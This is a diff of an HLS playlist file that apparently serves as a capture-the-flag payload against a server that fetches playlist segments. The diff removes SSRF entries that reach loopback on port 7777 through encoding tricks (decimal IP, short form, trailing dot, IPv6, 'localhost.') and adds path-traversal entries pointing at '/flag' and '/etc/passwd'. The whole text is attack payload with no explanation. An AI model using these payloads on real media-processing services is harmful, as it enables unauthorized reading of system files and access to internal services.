@@ -3,22 +3,8 @@
 #EXT-X-TARGETDURATION:10
 #EXT-X-MEDIA-SEQUENCE:0
 
-# decimal representation of 127.0.0.1
 #EXTINF:10,
-http://2130706433:7777/
+../../../../../../../../flag
 
-# short loopback
 #EXTINF:10,
-http://127.1:7777/
-
-# trailing dot
-#EXTINF:10,
-http://127.0.0.1.:7777/
-
-# IPv6 loopback
-#EXTINF:10,
-http://[::1]:7777/
-
-# hostname trick
-#EXTINF:10,
-http://localhost.:7777/
+../../../../../../../../etc/passwd
